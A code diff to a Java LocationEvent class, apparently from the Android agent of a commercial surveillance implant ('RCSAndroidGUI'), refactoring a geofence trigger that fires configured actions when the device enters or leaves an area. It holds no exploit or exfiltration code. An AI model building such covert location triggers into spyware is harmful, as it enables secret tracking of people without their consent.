@@ -9,10 +9,10 @@ import android.util.Log;
 
 import com.ht.RCSAndroidGUI.agent.position.GPSLocator;
 import com.ht.RCSAndroidGUI.agent.position.GPSLocatorDistance;
-import com.ht.RCSAndroidGUI.agent.position.RangeListener;
+import com.ht.RCSAndroidGUI.agent.position.RangeObserver;
 import com.ht.RCSAndroidGUI.util.DataBuffer;
 
-public class LocationEvent extends EventBase implements RangeListener {
+public class LocationEvent extends EventBase implements RangeObserver {
 
 	private static final String TAG = "LocationEvent";
 	int actionOnEnter;
@@ -26,6 +26,7 @@ public class LocationEvent extends EventBase implements RangeListener {
 	@Override
 	public void begin() {
 		locator = new GPSLocatorDistance(this, latitudeOrig, longitudeOrig, distance);
+		locator.start();
 	}
 
 	@Override
@@ -69,12 +70,14 @@ public class LocationEvent extends EventBase implements RangeListener {
 	public void go() {
 	}
 
-	public void onEnter() {
-		trigger(actionOnEnter);
-	}
 
-	public void onExit() {
-		trigger(actionOnExit);
+	public void notification(Boolean onEnter) {
+		if(onEnter){
+			trigger(actionOnEnter);
+		}else{
+			trigger(actionOnExit);
+		}
+		
 	}
 
 }
